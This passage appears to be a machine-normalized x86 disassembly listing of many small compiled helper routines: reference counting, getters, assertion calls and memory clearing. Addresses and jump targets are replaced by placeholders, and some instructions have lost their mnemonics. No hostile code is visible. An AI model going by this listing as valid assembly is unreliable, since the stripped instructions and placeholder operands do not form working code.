mov eax [ eax ]
call sub_408952
pop ebp
retn 0x4
sub_41040b
push ebp
mov ebp esp
push [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp + 0x8 ]
call sub_410b7f
pop ebp
retn 0x8
sub_410423
mov ecx [ eax ]
test ecx ecx
je r-xdata
xor ecx ecx
add ecx 0x4
jmp r-xdata
xor edx edx
inc edx
[ ecx ] edx
retn
sub_410438
mov eax [ eax ]
test eax eax
je r-xdata
retn
push esi
lea esi [ eax + 0x4 ]
call sub_40c2c3
pop esi
sub_41051d
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
call sub_408952
pop ebp
retn 0x4
sub_41052e
push ebp
mov ebp esp
push [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp + 0x8 ]
call sub_410bda
pop ebp
retn 0x8
sub_410546
mov ecx [ eax ]
test ecx ecx
je r-xdata
xor ecx ecx
add ecx 0x4
jmp r-xdata
xor edx edx
inc edx
[ ecx ] edx
retn
sub_41055b
mov eax [ eax ]
test eax eax
je r-xdata
retn
push esi
lea esi [ eax + 0x4 ]
call sub_40c2c3
pop esi
sub_4105f4
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
call sub_408952
pop ebp
retn 0x4
sub_410605
push ebp
mov ebp esp
push [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp + 0x8 ]
call sub_410c0a
pop ebp
retn 0x8
sub_41061d
mov ecx [ eax ]
test ecx ecx
je r-xdata
xor ecx ecx
add ecx 0x4
jmp r-xdata
xor edx edx
inc edx
[ ecx ] edx
retn
sub_410632
mov eax [ eax ]
test eax eax
je r-xdata
retn
push esi
lea esi [ eax + 0x4 ]
call sub_40c2c3
pop esi
sub_410643
push esi
mov esi eax
push edi
call sub_404720
mov eax [ edi + 0x1c ]
mov [ esi + 0x1c ] eax
mov eax esi
pop esi
retn
sub_4107f0
mov ecx [ ecx ]
mov [ eax ] ecx
test ecx ecx
je r-xdata
retn
xor edx edx
add ecx 0x4
inc edx
[ ecx ] edx
sub_410823
mov ecx [ ecx ]
mov [ eax ] ecx
test ecx ecx
je r-xdata
retn
xor edx edx
add ecx 0x4
inc edx
[ ecx ] edx
sub_410836
mov [ eax ] r--data
retn
sub_41083d
mov [ eax ] r--data
retn
sub_410844
mov [ eax ] r--data
retn
sub_41084b
mov [ eax ] r--data
retn
sub_410a19
add eax 0x4
retn
sub_410a1d
mov eax [ eax + 0x4 ]
retn
sub_410a21
push ebp
mov ebp esp
dec [ eax + 0x1c ]
mov eax [ ebp + 0x8 ]
pop ebp
retn 0x4
sub_410a2e
push ebp
mov ebp esp
lea eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
call sub_410ca9
pop ebp
retn 0x8
sub_410a41
mov al [ eax ]
retn
sub_410a6e
mov eax [ ecx ]
sub eax [ ecx + 0xc ]
neg eax
sbb eax eax
inc eax
retn
sub_410a79
retn 0x4
sub_410aa9
retn 0x4
sub_410ad9
push ebp
mov ebp esp
push esi
lea esi [ eax + 0xc ]
call sub_407e47
push [ ebp + 0xc ]
mov edx [ eax ]
mov ecx eax
call [ edx + 0xc ]
pop esi
pop ebp
retn 0x8
sub_410b21
retn 0x4
sub_410b7c
retn 0x4
sub_410bd7
retn 0x4
sub_410c07
retn 0x4
sub_410c37
mov eax [ eax + 0x4 ]
retn
sub_410c3b
mov eax [ edx + ecx * 8 ]
mov edx [ edx + ecx * 8 + 0x4 ]
retn
sub_410c43
push ebp
mov ebp esp
pop ebp
jmp sub_410ca9
sub_410ca6
mov eax [ eax ]
retn
sub_410e22
push 0x4
pop eax
jmp sub_411eff
sub_410e2a
mov eax 0x3fffffff
retn
sub_410e30
push r--data
call sub_446a95
sub_410e4b
push ebp
mov ebp esp
sub eax [ ebp + 0x8 ]
add [ ecx ] eax
pop ebp
retn
sub_411411
mov ecx [ ecx ]
mov [ eax ] ecx
test ecx ecx
je r-xdata
retn 0x4
xor edx edx
add ecx 0x4
inc edx
[ ecx ] edx
sub_411426
mov ecx [ esi + 0x18 ]
push rw-data
call sub_425554
test al al
jne r-xdata
mov eax [ esi + 0x14 ]
retn
push 0x10c
push r--data
push r--data
call sub_4258e2
add esp 0xc
sub_411452
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
pop ebp
retn
push [ ebp + 0x8 ]
call sub_411f83
sub_411486
mov eax [ eax + 0x8 ]
sub eax [ ecx + 0x8 ]
neg eax
sbb eax eax
inc eax
retn
sub_411492
mov ecx [ ecx ]
mov [ eax ] ecx
test ecx ecx
je r-xdata
retn 0x4
xor edx edx
add ecx 0x4
inc edx
[ ecx ] edx
sub_4115a9
mov ecx [ ecx ]
mov [ eax ] ecx
test ecx ecx
je r-xdata
retn 0x4
xor edx edx
add ecx 0x4
inc edx
[ ecx ] edx
sub_4115be
mov ecx [ ecx ]
mov [ eax ] ecx
test ecx ecx
je r-xdata
retn 0x4
xor edx edx
add ecx 0x4
inc edx
[ ecx ] edx
j_sub_413ee7
jmp sub_413ee7
sub_4118f1
push ebp
mov ebp esp
push ecx
mov al [ ebp - 0x1 ]
leave
retn
sub_411921
mov eax [ eax ]
test eax eax
je r-xdata
retn
push esi
lea esi [ eax + 0x4 ]
call sub_40c2c3
pop esi
sub_411932
xor eax eax
retn
sub_411959
push ebp
mov ebp esp
mov ecx [ eax + 0x4 ]
push [ ebp + 0x8 ]
mov eax [ eax ]
push ecx
push eax
call sub_413b85
add esp 0xc
pop ebp
retn
sub_411970
mov ecx [ esi + 0x1c ]
push rw-data
call sub_425554
test al al
jne r-xdata
mov eax [ esi + 0x18 ]
retn
push 0x139
push r--data
push r--data
call sub_4258e2
add esp 0xc
sub_4119d7
mov eax [ eax + 0x2c ]
add eax 0x8
retn
sub_4119de
retn
sub_4119df
retn
sub_4119e0
push ebp
mov ebp esp
sub eax [ ebp + 0x8 ]
add [ ecx ] eax
pop ebp
retn
sub_4119ea
retn
sub_4119eb
push ebp
mov ebp esp
mov ecx 0x100
mov edx [ ebp + 0x8 ]
mov dl [ edx ]
dec ecx
mov [ eax ] dl
inc eax
test ecx ecx
jg r-xdata
pop ebp
retn
sub_411a02
retn
sub_411a03
retn
sub_411a04
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
sub ecx [ ebp + 0x8 ]
add [ eax ] ecx
pop ebp
retn
sub_411a11
add [ eax ] ecx
retn
sub_411a14
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
pop ebp
retn
sub_411a1c
push ebp
mov ebp esp
cmp eax [ ebp + 0x8 ]
je r-xdata
pop ebp
retn
mov cl [ ecx ]
inc eax
cmp eax [ ebp + 0x8 ]
jne r-xdata
cmp [ eax ] cl
je r-xdata
sub_411a32
mov [ edx ] ecx
mov [ eax ] ecx
retn
sub_411a37
push ebp
mov ebp esp
push ecx
mov al [ ebp - 0x1 ]
leave
retn
sub_411a8c
push ebp
mov ebp esp
push ecx
push [ ebp - 0x4 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_413bd8
add esp 0xc
leave
retn
sub_411aa3
push 0x0
push 0x1
call sub_40487c
retn
sub_411aad
push ebp
mov ebp esp
push ecx
lea ecx [ eax + 0x1c ]
push ecx
push eax
push [ ebp + 0x8 ]
call sub_41205a
mov eax [ ebp + 0x8 ]
pop ecx
pop ebp
retn 0x4
sub_411c1b
push ebp
mov ebp esp
call sub_407e47
mov edx [ eax ]
mov ecx eax
pop ebp
jmp [ edx + 0x8 ]
sub_411c89
push ebp
mov ebp esp
call sub_407e47
mov edx [ eax ]
mov ecx eax
pop ebp
jmp [ edx + 0x8 ]
sub_411d7c
push ebp
mov ebp esp
mov eax [ eax ]
call sub_408952
mov eax [ ebp + 0x8 ]
pop ebp
retn 0x4
sub_411e0f
push ebp
mov ebp esp
mov eax [ eax ]
call sub_408952
mov eax [ ebp + 0x8 ]
pop ebp
retn 0x4
sub_411e60
push ebp
mov ebp esp
mov eax [ eax ]
call sub_408952
mov eax [ ebp + 0x8 ]
pop ebp
retn 0x4
sub_411ec0
push ebp
mov ebp esp
mov eax [ eax ]
call sub_408952
mov eax [ ebp + 0x8 ]
pop ebp
retn 0x4
sub_411ed1
test eax eax
je r-xdata
retn
mov ecx [ ecx ]
mov [ eax ] ecx
sub_411eda
push ebp
mov ebp esp
push ecx
push [ ebp - 0x4 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_413eaa
add esp 0xc
leave
retn
sub_411ef1
test ecx ecx
je r-xdata
retn
push edi
xor eax eax
mov edi edx
[ edi ]
pop edi
sub_411efe
retn
sub_411f83
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_407d32
push [ ebp + 0x8 ]
call sub_424fc7
mov eax [ ebp + 0x8 ]
pop ecx
pop ebp
retn 0x4
sub_411f9e
push 0xffffffff
push 0x0
push edi
mov ecx esi
call sub_404e0f
mov eax [ edi + 0x1c ]
mov [ esi + 0x1c ] eax
mov eax esi
retn
sub_411fb3
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push 0x0
push 0x1
call sub_40487c
mov eax [ ebp + 0x8 ]
pop ebp
retn 0x4
sub_411fc9
push 0x0
push 0x1
call sub_40487c
retn
sub_411fd3
mov al 0x1
retn
sub_411fd6
mov [ eax ] ecx
retn
sub_411fd9
mov eax [ eax ]
retn
sub_412016
mov [ eax ] 0x3ffffffe
retn
sub_41201d
test eax eax
je r-xdata
retn
mov ecx [ ecx ]
mov [ eax ] ecx
j_sub_413ee7#2
jmp sub_413ee7
sub_412094
add eax 0x8
retn
sub_412098
push ebp
mov ebp esp
mov eax [ ecx ]
pop ebp
jmp [ eax + 0x4 ]
sub_4120a1
mov eax [ eax ]
test eax eax
je r-xdata
retn
push esi
lea esi [ eax + 0x4 ]
call sub_40c2c3
pop esi
sub_4120b2
mov eax [ eax ]
retn
sub_4120b5
add [ eax ] 0x4
retn
sub_4120b9
mov eax [ eax ]
xor ecx ecx
cmp eax [ edx ]
setne al
retn
sub_4120c3
mov eax [ eax ]
retn
sub_4120c6
mov eax [ eax ]
retn
sub_4120c9
mov edx [ ecx + 0x4 ]
cmp edx [ ecx + 0x8 ]
je r-xdata
mov ecx [ ecx + 0xc ]
imul ecx edx
mov [ eax ] ecx
retn
mov [ eax ] 0x3ffffffe
retn
sub_4120e1
mov edx [ ecx + 0x4 ]
cmp edx [ ecx + 0x8 ]
je r-xdata
mov ecx [ ecx + 0xc ]
imul ecx edx
mov [ eax ] ecx
retn
mov [ eax ] 0x3ffffffe
retn
sub_4120f9
mov eax [ eax ]
retn
sub_4120fc
mov eax [ eax ]
retn
sub_4120ff
cmp [ esi ] 0x0
jne r-xdata
mov eax [ esi ]
retn
push 0xa2
push r--data
push r--data
call sub_4258e2
add esp 0xc
sub_41211e
cmp [ esi ] 0x0
jne r-xdata
mov eax [ esi ]
retn
push 0xa2
push r--data
push r--data
call sub_4258e2
add esp 0xc
sub_41213d
cmp [ esi ] 0x0
jne r-xdata
mov eax [ esi ]
retn
push 0xa2
push r--data
push r--data
call sub_4258e2
add esp 0xc
sub_41215c
cmp [ esi ] 0x0
jne r-xdata
mov eax [ esi ]
retn
push 0xa2
push r--data
push r--data
call sub_4258e2
add esp 0xc
sub_41217b
cmp [ esi ] 0x0
jne r-xdata
mov eax [ esi ]
retn
push 0xa2
push r--data
push r--data
call sub_4258e2
add esp 0xc
sub_41219a
cmp [ esi ] 0x0
jne r-xdata
mov eax [ esi ]
retn
push 0xa2
push r--data
push r--data
call sub_4258e2
add esp 0xc
sub_4121b9
cmp [ esi ] 0x0
jne r-xdata
mov eax [ esi ]
retn
push 0xa2
push r--data
push r--data
call sub_4258e2
add esp 0xc
sub_412255
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
call sub_408952
pop ebp
retn 0x4
sub_412266
push ebp
mov ebp esp
push [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp + 0x8 ]
call sub_4124b2
pop ebp
retn 0x8
sub_41227e
mov ecx [ eax ]
test ecx ecx
je r-xdata
xor ecx ecx
add ecx 0x4
jmp r-xdata
xor edx edx
inc edx
[ ecx ] edx
retn
sub_412293
mov eax [ eax ]
test eax eax
je r-xdata
retn
push esi
lea esi [ eax + 0x4 ]
call sub_40c2c3
pop esi
sub_41232d
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
call sub_408952
pop ebp
retn 0x4
sub_41233e
push ebp
mov ebp esp
push [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp + 0x8 ]
call sub_4124e2
pop ebp
retn 0x8
sub_412356
mov ecx [ eax ]
test ecx ecx
je r-xdata
xor ecx ecx
add ecx 0x4
jmp r-xdata
xor edx edx
inc edx
[ ecx ] edx
retn
sub_41236b
mov eax [ eax ]
test eax eax
je r-xdata
retn
push esi
lea esi [ eax + 0x4 ]
call sub_40c2c3
pop esi
sub_41237c
mov [ eax ] ecx
retn
sub_41237f
push ebp
mov ebp esp
mov [ eax ] ecx
mov ecx [ ebp + 0x8 ]
mov [ eax + 0x4 ] ecx
mov ecx [ ebp + 0xc ]
mov [ eax + 0x8 ] ecx
pop ebp
retn 0x8
sub_412496
push r--data
call sub_446ae2
sub_4124af
retn 0x4
sub_4124df
retn 0x4
sub_41250f
retn
sub_4139f2
mov eax [ eax + 0x8 ]
sub eax [ ecx + 0x8 ]
neg eax
sbb eax eax
inc eax
retn
sub_4139fe
mov ecx [ ecx ]
mov [ eax ] ecx
test ecx ecx
je r-xdata
retn 0x4
xor edx edx
add ecx 0x4
inc edx
[ ecx ] edx
sub_413a13
mov ecx [ ecx ]
mov [ eax ] ecx
test ecx ecx
je r-xdata
retn 0x4
xor edx edx
add ecx 0x4
inc edx
[ ecx ] edx
sub_413a28
mov ecx [ ecx ]
mov [ eax ] ecx
test ecx ecx
je r-xdata
retn 0x4
xor edx edx
add ecx 0x4
inc edx
[ ecx ] edx
sub_413a3d
mov ecx [ ecx ]
mov [ eax ] ecx
test ecx ecx
je r-xdata
retn 0x4
xor edx edx
add ecx 0x4
inc edx
[ ecx ] edx
sub_413a52
mov ecx [ ecx ]
mov [ eax ] ecx
test ecx ecx
je r-xdata
retn 0x4
xor edx edx
add ecx 0x4
inc edx
[ ecx ] edx
sub_413b55
mov ecx [ ecx ]
mov [ eax ] ecx
test ecx ecx
je r-xdata
retn 0x4
xor edx edx
add ecx 0x4
inc edx
[ ecx ] edx
sub_413b6a
mov ecx [ ecx ]
mov [ eax ] ecx
test ecx ecx
je r-xdata
retn 0x4
xor edx edx
add ecx 0x4
inc edx
[ ecx ] edx
sub_413b7f
retn
j_sub_414101
jmp sub_414101
sub_413bca
push 0x0
push 0x1
call sub_40487c
retn
sub_413bd4
retn
sub_413bd5
xor eax eax
retn
sub_413c2e
retn
sub_413c2f
retn
sub_413c30
retn
sub_413dc4
push ebp
mov ebp esp
mov eax [ ecx ]
pop ebp
jmp [ eax + 0x4 ]
sub_413e83
push ebp
mov ebp esp
call sub_407e47
push [ ebp + 0x8 ]
mov edx [ eax ]
mov ecx eax
call [ edx + 0x4 ]
xor ecx ecx
test al al
setne al
pop ebp
retn 0x4
sub_413ea0
retn
sub_413ea1
push ebp
mov ebp esp
push ecx
mov al [ ebp - 0x1 ]
leave
retn
sub_413ecd
xor eax eax
retn
sub_413ed0
test ecx ecx
je r-xdata
retn
push edi
xor eax eax
mov edi edx
[ edi ]
pop edi
sub_413edd
retn
sub_413ede
test eax eax
je r-xdata
retn
mov ecx [ ecx ]
mov [ eax ] ecx
sub_413f15
retn
sub_413f16
mov eax [ eax ]
test eax eax
je r-xdata
retn
push esi
lea esi [ eax + 0x4 ]
call sub_40c2c3
pop esi
sub_413f6a
push ebp
mov ebp esp
mov eax [ eax ]
call sub_408952
mov eax [ ebp + 0x8 ]
pop ebp
retn 0x4
sub_413fbb
push ebp
mov ebp esp
mov eax [ eax ]
call sub_408952
mov eax [ ebp + 0x8 ]
pop ebp
retn 0x4
sub_413fcc
push 0x0
push 0x1
call sub_40487c
retn
sub_413fd6
push 0x0
push 0x1
call sub_40487c
retn
sub_413fe0
add eax 0x4
jmp sub_403855
sub_413fe8
mov eax [ eax ]
test eax eax
je r-xdata
retn
push esi
lea esi [ eax + 0x4 ]
call sub_40c2c3
pop esi
sub_413ff9
mov eax [ eax ]
test eax eax
je r-xdata
retn
push esi
lea esi [ eax + 0x4 ]
call sub_40c2c3
pop esi
sub_41400a
mov eax [ eax ]
test eax eax
je r-xdata
retn
push esi
lea esi [ eax + 0x4 ]
call sub_40c2c3
pop esi
sub_41401b
push esi
lea esi [ eax + 0x24 ]
call sub_41472b
pop esi
retn
sub_414026
mov eax [ edi ]
test eax eax
je r-xdata
mov eax edi
retn
push esi
lea esi [ eax + 0x4 ]
call sub_40c2c3
pop esi
sub_4140a3
shl eax 0x5
add eax [ ecx ]
retn
sub_4140a9
push ebp
mov ebp esp
call sub_407e47
mov edx [ eax ]
mov ecx eax
pop ebp
jmp [ edx + 0x4 ]
sub_4140b9
push ebp
mov ebp esp
push [ ebp + 0x8 ]
mov eax [ ecx ]
call [ eax + 0x4 ]
pop ebp
retn
sub_414101
test ecx ecx
je r-xdata
retn
mov eax [ eax ]
mov [ ecx ] eax
test eax eax
je r-xdata
xor ecx ecx
add eax 0x4
inc ecx
[ eax ] ecx
sub_414118
push 0x0
push 0x1
call sub_40487c
retn
sub_414122
mov eax [ eax ]
retn
sub_414125
mov eax [ eax ]
retn
sub_414128
mov eax [ eax ]
retn
sub_41412b
mov eax [ eax ]
retn
sub_41412e
mov eax [ eax ]
retn
sub_414131
mov eax [ eax ]
retn
sub_414134
mov eax [ eax ]
retn
sub_414137
cmp [ esi ] 0x0
jne r-xdata
mov eax [ esi ]
retn
push 0xa2
push r--data
push r--data
call sub_4258e2
add esp 0xc
sub_414156
cmp [ esi ] 0x0
jne r-xdata
mov eax [ esi ]
retn
push 0xa2
push r--data
push r--data
call sub_4258e2
add esp 0xc
sub_41422d
push edi
xor eax eax
mov edi ecx
stosw [ edi ]
mov [ ecx + 0x2 ] ax
mov eax ecx
pop edi
retn
sub_41423c
cmp [ eax + 0x2 ] 0x0
sete cl
mov [ eax + 0x2 ] cl
retn
sub_414247
mov [ eax ] cl
retn
sub_41426f
push ebp
mov ebp esp
push esi
lea esi [ ecx + 0x8 ]
call sub_407804
mov ecx eax
mov eax [ ebp + 0x8 ]
call sub_415b48
pop esi
pop ebp
retn 0x4
sub_41428a
push ebp
mov ebp esp
push esi
lea esi [ ecx + 0x8 ]
call sub_407e47
mov edx [ eax ]
pop esi
mov ecx eax
pop ebp
jmp [ edx + 0x8 ]
sub_41429f
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
call sub_408952
pop ebp
retn 0x4
sub_4142b0
push ebp
mov ebp esp
push [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp + 0x8 ]
call sub_41463c
pop ebp
retn 0x8
sub_4142c8
mov ecx [ eax ]
test ecx ecx
je r-xdata
xor ecx ecx
add ecx 0x4
jmp r-xdata
xor edx edx
inc edx
[ ecx ] edx
retn
sub_4142dd
mov eax [ eax ]
test eax eax
je r-xdata
retn
push esi
lea esi [ eax + 0x4 ]
call sub_40c2c3
pop esi
sub_414313
push ebp
mov ebp esp
push esi
lea esi [ ecx + 0x8 ]
call sub_407804
mov ecx eax
mov eax [ ebp + 0x8 ]
call sub_415b72
pop esi
pop ebp
retn 0x4
sub_41432e
push ebp
mov ebp esp
push esi
lea esi [ ecx + 0x8 ]
call sub_407e47
mov edx [ eax ]
pop esi
mov ecx eax
pop ebp
jmp [ edx + 0x8 ]
sub_414343
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
call sub_408952
pop ebp
retn 0x4
sub_414354
push ebp
mov ebp esp
push [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp + 0x8 ]
call sub_414697
pop ebp
retn 0x8
sub_41436c
mov ecx [ eax ]
test ecx ecx
je r-xdata
xor ecx ecx
add ecx 0x4
jmp r-xdata
xor edx edx
inc edx
[ ecx ] edx
retn
sub_414381
mov eax [ eax ]
test eax eax
je r-xdata
retn
push esi
lea esi [ eax + 0x4 ]
call sub_40c2c3
pop esi
sub_414392
push esi
mov esi ecx
call sub_4146ef
mov eax esi
pop esi
retn
sub_41439e
push esi
mov esi ecx
call sub_4146ef
mov eax esi
pop esi
retn
sub_4143aa
call sub_415ba0
xor ecx ecx
mov [ esi ] ax
cmp cx ax
jne r-xdata
mov eax esi
retn
push 0x5a
push r--data
push r--data
call sub_4258e2
add esp 0xc
sub_4143d0
call sub_415ba0
xor ecx ecx
mov [ esi ] ax
cmp cx ax
jne r-xdata
mov eax esi
retn
push 0x5a
push r--data
push r--data
call sub_4258e2
add esp 0xc
sub_4143f6
call sub_415ba0
xor ecx ecx
mov [ esi ] ax
cmp cx ax
jne r-xdata
mov eax esi
retn
push 0x5a
push r--data
push r--data
call sub_4258e2
add esp 0xc
sub_41441c
call sub_415ba0
xor ecx ecx
mov [ esi ] ax
cmp cx ax
jne r-xdata
mov eax esi
retn
push 0x5a
push r--data
push r--data
call sub_4258e2
add esp 0xc
sub_414442
mov [ eax ] ecx
retn
sub_414445
mov [ eax ] ecx
retn
sub_414448
push ebp
mov ebp esp
mov ecx [ eax + 0x204 ]
push [ ebp + 0x8 ]
mov eax [ ecx ]
call [ eax + 0x8 ]
mov [ esi ] al
mov eax esi
pop ebp
retn 0x4
sub_414461
mov [ eax ] cl
retn
sub_414464
push ebp
mov ebp esp
push 0x28
push r--data
push r--data
call sub_4258e2
mov eax [ ebp + 0x8 ]
add esp 0xc
pop ebp
retn 0x4
sub_414568
push 0x3
pop ecx
xor edx edx
mov [ eax + ecx * 8 ] edx
dec ecx
mov [ eax + ecx * 8 + 0xc ] edx
jns r-xdata
mov [ eax + 0x20 ] edx
mov [ eax + 0x24 ] edx
mov [ eax + 0x28 ] edx
mov [ eax + 0x2c ] edx
retn
j_sub_41472b
jmp sub_41472b
sub_4145c9
push 0x3
pop ecx
and [ eax + ecx * 8 ] 0x0
and [ eax + ecx * 8 + 0x4 ] 0x0
dec ecx
jns r-xdata
retn
sub_414639
retn 0x4
sub_414694
retn 0x4
sub_414720
xor ecx ecx
mov [ eax ] ecx
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] ecx
retn
sub_41472b
mov eax [ esi ]
test eax eax
je r-xdata
and [ esi ] 0x0
and [ esi + 0x4 ] 0x0
and [ esi + 0x8 ] 0x0
retn
push eax
call sub_424fc7
pop ecx
sub_414744
retn
sub_41479f
retn
sub_4147a0
xor ecx ecx
mov [ eax ] ecx
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] ecx
retn 0x4
sub_4147ad
retn
sub_4147ae
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_424fc7
pop ecx
pop ebp
retn 0x4
sub_4147be
retn
sub_4147bf
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
dec ecx
mov [ eax ] ecx
pop ebp
retn
sub_41525e
call sub_403b02
neg eax
sbb eax eax
neg eax
retn
sub_41526a
call sub_403b02
neg eax
sbb eax eax
inc eax
retn
sub_4159db
retn
sub_4159dc
mov ecx [ ecx ]
mov [ eax ] ecx
test ecx ecx
je r-xdata
retn 0x4
xor edx edx
add ecx 0x4
inc edx
[ ecx ] edx
sub_4159f1
mov ecx [ ecx ]
mov [ eax ] ecx
test ecx ecx
je r-xdata
retn 0x4
xor edx edx
add ecx 0x4
inc edx
[ ecx ] edx
sub_415a06
retn
sub_415a07
push ebp
mov ebp esp
push [ ebp + 0x10 ]
mov eax [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_418ece
pop ecx
mov [ esi ] eax
pop ecx
mov eax esi
pop ebp
retn
sub_415a20
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
pop ebp
retn
sub_415a59
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
inc ecx
mov [ eax ] ecx
pop ebp
retn
sub_415a64
push ebp
mov ebp esp
call sub_407e47
mov edx [ eax ]
mov ecx eax
pop ebp
jmp [ edx + 0x4 ]
sub_415a74
push ebp
mov ebp esp
jmp r-xdata
cmp [ ebp + 0x8 ] 0x0
ja r-xdata
mov ecx [ ebp + 0xc ]
mov ecx [ ecx ]
dec [ ebp + 0x8 ]
mov [ eax ] ecx
add eax 0x4
pop ebp
retn
sub_415af9
push 0x0
push 0x1
call sub_40487c
retn
sub_415b03
cmp [ ecx + 0x14 ] 0x10
jb r-xdata
mov [ eax ] ecx
retn
mov ecx [ ecx ]
sub_415b0e
cmp [ ecx + 0x14 ] 0x10
jb r-xdata
mov edx ecx
mov edx [ ecx ]
jmp r-xdata
mov ecx [ ecx + 0x10 ]
add ecx edx
mov [ eax ] ecx
retn
sub_415b22
push ebp
mov ebp esp
mov ecx [ eax + 0x204 ]
push [ ebp + 0x8 ]
mov eax [ ecx ]
call [ eax + 0x8 ]
pop ebp
retn
sub_415b35
cmp [ eax + 0x14 ] 0x10
jb r-xdata
mov ecx eax
mov ecx [ eax ]
jmp r-xdata
mov eax [ eax + 0x10 ]
add eax ecx
retn
sub_415b47
retn
sub_415b60
retn
sub_415b61
push ebp
mov ebp esp
mov eax [ eax ]
call sub_408952
mov eax [ ebp + 0x8 ]
pop ebp
retn 0x4
sub_415b8e
retn
sub_415b8f
push ebp
mov ebp esp
mov eax [ eax ]
call sub_408952
mov eax [ ebp + 0x8 ]
pop ebp
retn 0x4
sub_415bd8
push 0x3
pop ecx
and [ eax + ecx * 8 ] 0x0
and [ eax + ecx * 8 + 0x4 ] 0x0
dec ecx
jns r-xdata
retn
sub_415be8
retn
sub_415be9
push esi
push edi
push 0x8
pop ecx
mov esi edx
mov edi eax
[ edi ] [ esi ]
pop edi
pop esi
retn
sub_415bf7
push esi
lea esi [ eax + 0x24 ]
call sub_41472b
pop esi
retn
sub_415c02
push esi
lea esi [ eax + 0x24 ]
call sub_41472b
pop esi
retn
sub_415c0d
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push 0x0
push 0x1
call sub_40487c
mov eax [ ebp + 0x8 ]
pop ebp
retn 0x4
sub_415c23
cmp [ eax + 0x14 ] 0x10
jb r-xdata
retn
mov eax [ eax ]
sub_415c2c
dec [ eax ]
retn
sub_415c2f
mov eax [ eax ]
retn
sub_415c32
mov eax [ eax ]
retn
sub_415c35
mov eax [ eax ]
retn
sub_415c38
cmp [ esi ] 0x0
jne r-xdata
mov eax [ esi ]
retn
push 0xa2
push r--data
push r--data
call sub_4258e2
add esp 0xc
sub_415c57
cmp [ esi ] 0x0
jne r-xdata
mov eax [ esi ]
retn
push 0xa2
push r--data
push r--data
call sub_4258e2
add esp 0xc
sub_415c76
retn
sub_415c77
mov al [ eax + 0x20 ]
retn
sub_415c7b
mov ax [ eax + 0x22 ]
retn
sub_415c80
add eax 0x24
retn
sub_415c84
cmp [ eax + 0x20 ] 0x0
sete cl
mov [ eax + 0x20 ] cl
retn
sub_415ce4
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
mov [ ecx + 0x21 ] 0x1
je r-xdata
mov ax [ eax ]
or [ ecx + 0x22 ] ax
add ecx 0x24
call sub_417446
jmp r-xdata
pop ebp
retn 0x4
sub_415d06
mov eax [ ecx ]
sub eax [ ecx + 0x4 ]
neg eax
sbb eax eax
inc eax
retn
sub_415d76
push ebp
mov ebp esp
push esi
lea esi [ ecx + 0x28 ]
call sub_407e47
mov edx [ eax ]
pop esi
mov ecx eax
pop ebp
jmp [ edx + 0x8 ]
sub_415dab
push ebp
mov ebp esp
mov edx [ ebp + 0xc ]
push ebx
push [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_417497
pop ebx
pop ebp
retn 0x8
sub_415dc5
mov ecx [ eax ]
test ecx ecx
je r-xdata
xor ecx ecx
add ecx 0x4
jmp r-xdata
xor edx edx
inc edx
[ ecx ] edx
retn
sub_415dda
mov eax [ eax ]
test eax eax
je r-xdata
retn
push esi
lea esi [ eax + 0x4 ]
call sub_40c2c3
pop esi
sub_415e4e
push ebp
mov ebp esp
push esi
lea esi [ ecx + 0x28 ]
call sub_407e47
mov edx [ eax ]
pop esi
mov ecx eax
pop ebp
jmp [ edx + 0x8 ]
sub_415e83
push ebp
mov ebp esp
mov edx [ ebp + 0xc ]
push ebx
push [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_41755b
pop ebx
pop ebp
retn 0x8
sub_415e9d
mov ecx [ eax ]
test ecx ecx
je r-xdata
xor ecx ecx
add ecx 0x4
jmp r-xdata
xor edx edx
inc edx
[ ecx ] edx
retn
sub_415eb2
mov eax [ eax ]
test eax eax
je r-xdata
retn
push esi
lea esi [ eax + 0x4 ]
call sub_40c2c3
pop esi
sub_415f0f
push ebp
mov ebp esp
push esi
lea esi [ ecx + 0xc ]
call sub_407e47
mov edx [ eax ]
pop esi
mov ecx eax
pop ebp
jmp [ edx + 0x8 ]
sub_415f24
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
call sub_408952
pop ebp
retn 0x4
sub_415f35
push ebp
mov ebp esp
push esi
push [ ebp + 0xc ]
mov esi ecx
push [ ebp + 0xc ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
